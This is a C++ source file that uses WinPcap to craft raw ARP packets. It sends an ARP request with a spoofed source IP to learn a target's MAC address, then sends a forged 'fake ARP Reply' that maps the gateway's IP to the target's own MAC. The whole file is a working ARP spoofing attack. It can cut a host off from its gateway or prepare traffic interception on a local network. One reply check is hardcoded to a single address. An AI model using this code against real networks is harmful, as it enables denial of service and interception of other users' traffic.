#include <iostream>
#include <vector>
#include <string>

#include <pcap.h>
#include <winsock.h>
// #include <WinSock2.h>

#include "arp.h"
#include "device_description.h"

using namespace std;

#pragma comment(lib,"ws2_32")

// static ip_mac dst_ipmac;

void getmac(pcap_t * fp, ip_mac & dst_ipmac,
            string target, string gateway)
{
    u_char sendbuf[42];
    ethhdr eth;
    arphdr arp;

    for (int i = 0; i < 6; ++i) {
        eth.eh_dst[i] = 0xff;
        eth.eh_src[i] = 0x0f;
        arp.arp_sha[i] = 0x0f;
        arp.arp_tha[i] = 0x00;
    }

    dst_ipmac.ip = inet_addr(target.c_str());

    eth.eh_type = htons(ETH_ARP);
    arp.arp_hdr = htons(ARP_HARDWARE);
    arp.arp_pro = htons(ETH_IP);
    arp.arp_hln = 6;
    arp.arp_pln = 4;
    arp.arp_opt = htons(ARP_REQUEST);
    arp.arp_tpa = dst_ipmac.ip;

    // make a fake src ip
    string::reverse_iterator riter = gateway.rbegin();
    if (*riter != '9' && *riter !=  '4')
        *riter += 1;
    else
        *riter = '3';
    arp.arp_spa = inet_addr(gateway.c_str());

    memset(sendbuf, 0, sizeof(sendbuf));
    memcpy(sendbuf, &eth, sizeof(eth));
    memcpy(sendbuf+sizeof(eth), &arp, sizeof(arp));


    // send and capture
    pcap_pkthdr * pkt_header;
    u_char * pkt_data;
    
    /* while (1) */
    {
        if(pcap_sendpacket(fp, sendbuf, 42) == 0)
        {
            printf("\nPacketSend succeed\n\n");
        }
        else
        {
            cerr << "error" << endl;
            return ;
        }

        int res = 0;
        while ((res = pcap_next_ex(fp, &pkt_header, (const u_char**)&pkt_data)) >= 0) 
        { 
            // timeout
            if (res == 0)
                continue;

            if(*(u_short *)(pkt_data+12) == htons(ETH_ARP)
                && *(u_short*)(pkt_data+20) == htons(ARP_REPLY)
                && *(u_long*)(pkt_data+38) == inet_addr("172.18.161.2"))
            {
                for (int i = 0; i < 6; ++i)
                    dst_ipmac.mac[i] = *(u_char *)(pkt_data+22+i);

                cout << "dst ip adress: " << endl;
                cout << iptos(dst_ipmac.ip) <<endl;
                cout << "dst mac adress: " << endl;
                for (int i = 0; i < 6; ++i) {
                    dst_ipmac.mac[i] = *(u_char *)(pkt_data+22+i);
                    printf("%x.", dst_ipmac.mac[i]);
                }
                
                cout << endl;

                break;
            }
        }

        Sleep(100);
    }
}

void sendARPReply(pcap_t * fp, ip_mac & dst_ipmac, string gateway)
{
    u_char sendbuf[42];
    ethhdr eth;
    arphdr arp;

    for (int i = 0; i < 6; ++i) {
        eth.eh_dst[i] = dst_ipmac.mac[i];
        eth.eh_src[i] = dst_ipmac.mac[i];
        arp.arp_sha[i] = dst_ipmac.mac[i];
        arp.arp_tha[i] = dst_ipmac.mac[i];
    }

    eth.eh_type = htons(ETH_ARP);
    arp.arp_hdr = htons(ARP_HARDWARE);
    arp.arp_pro = htons(ETH_IP);
    arp.arp_hln = 6;
    arp.arp_pln = 4;
    arp.arp_opt = htons(ARP_REPLY);
    arp.arp_tpa = dst_ipmac.ip;
    arp.arp_spa = inet_addr(gateway.c_str());

    memset(sendbuf, 0, sizeof(sendbuf));
    memcpy(sendbuf, &eth, sizeof(eth));
    memcpy(sendbuf+sizeof(eth), &arp, sizeof(arp));


    // send 
    if(pcap_sendpacket(fp, sendbuf, 42) == 0)
    {
        printf("\nfake ARP Reply send succeed\n\n");
    }
    else
    {
        cerr << "error" << endl;
        return ;
    }
}